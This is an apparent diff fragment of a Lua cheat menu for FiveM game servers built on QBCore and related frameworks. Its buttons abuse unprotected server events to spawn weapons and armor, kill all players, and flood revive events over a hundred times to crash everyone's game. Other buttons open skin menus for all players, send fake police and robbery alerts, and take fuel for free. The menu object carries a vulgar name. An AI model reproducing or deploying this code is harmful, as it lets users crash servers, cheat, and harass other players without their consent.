+				TriggerServerEvent('QBCore:Server:AddItem', "weapon_pistol_mk2", 1)
+				TriggerServerEvent('QBCore:Server:AddItem', "weapon_pistol50", 1)
+                TriggerServerEvent('QBCore:Server:AddItem', "armor", 2)
+            elseif IhadSexWithMyStepMother.Button("~r~Kill All Players in Server") then
+                TriggerServerEvent("qb-admin:server:killPlayer", -1)
+				TriggerServerEvent("ipx-admin:server:killPlayer", -1)
+                TriggerServerEvent("drk-admin:server:killPlayer", -1)
+            elseif IhadSexWithMyStepMother.Button("~r~Crash all player rl") then
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+                TriggerServerEvent("rl-admin:server:revivePlayer", -1)
+            elseif IhadSexWithMyStepMother.Button("~r~Crash all player ipx") then
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+            elseif IhadSexWithMyStepMother.Button("~r~Crash all player qb") then
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+                TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+            elseif IhadSexWithMyStepMother.Button("~r~Crash all player drk") then
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)                
+				elseif IhadSexWithMyStepMother.Button("~g~REVIVE All Players in Server") then
+				TriggerServerEvent("qb-admin:server:revivePlayer", -1)
+				TriggerServerEvent("ipx-admin:server:revivePlayer", -1)
+                TriggerServerEvent("drk-admin:server:revivePlayer", -1)
+            elseif IhadSexWithMyStepMother.Button("Open Skin Menu For All") then
+                TriggerServerEvent('bw-admin:server:OpenSkinMenu', -1)
+                TriggerServerEvent('qb-admin:server:OpenSkinMenu', -1)
+				TriggerServerEvent('ipx-admin:server:OpenSkinMenu', -1)
+				TriggerServerEvent('drk-admin:server:OpenSkinMenu', -1)
+            elseif IhadSexWithMyStepMother.Button("~b~Troll Cops Notifcations") then
+                TriggerServerEvent("txaLogger:DeathNotice", killer, deathResean)
+                TriggerServerEvent("qb-bankrobbery:server:callCops", "pacific", 0, streetLabel, pos)
+                TriggerServerEvent("qb-bankrobbery:server:callCops", "paleto", 0, streetLabel, pos)
+                TriggerServerEvent("police:server:GunshotAlert", streetLabel, pacific, true, policestaion, vehicleInfo)
+                TriggerServerEvent("prison:server:SecurityLockdown")
+                TriggerEvent("police:SetCopAlert")
+                TriggerServerEvent('qb-drugs:server:callCops', streetLabel, pos)
+                TriggerServerEvent('qb-jewellery:server:PoliceAlertMessage', "69 Store On Top", plyCoords, false)
+                TriggerServerEvent('qb-jewellery:server:PoliceAlertMessage', "69 Store On Top", plyCoords, true)
+                TriggerEvent("chatMessage", "69 Store On Top", "69 Store On Top", msg)
+                TriggerServerEvent("police:server:VehicleCall", pos, msg, alertTitle, streetLabel, modelPlate, Name)
+            elseif IhadSexWithMyStepMother.Button("~y~Gas for car") then
+                TriggerServerEvent('fuel:pay', 0)
+            elseif IhadSexWithMyStepMother.Button("Give Your Self Pistol 50.") then
+                TriggerServerEvent("QBCore:Server:AddItem", "weapon_pistol50", 1)
+				TriggerServerEvent("ipxCore:Server:AddItem", "weapon_pistol50", 1)
+                TriggerServerEvent("QBCore:Server:AddItem", "pistol_ammo", 30)
+				TriggerServerEvent("ipxCore:Server:AddItem", "pistol_ammo", 30)
+                TriggerServerEvent("bw:Server:AddItem", "weapon_pistol50", 1)
